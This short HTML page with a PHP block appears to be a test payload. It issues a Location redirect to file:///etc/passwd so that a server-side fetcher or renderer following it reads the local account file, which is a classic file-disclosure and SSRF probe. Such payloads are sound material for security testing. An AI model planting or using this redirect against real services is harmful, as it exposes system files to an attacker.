<!DOCTYPE html>
<html>
<head>
    <title>Read /etc/passwd</title>
</head>
<body>
    <h1>Location Redirect to /etc/passwd</h1>
    <?php 
        header('Location: file:///etc/passwd');
    ?>
</body>
</html>
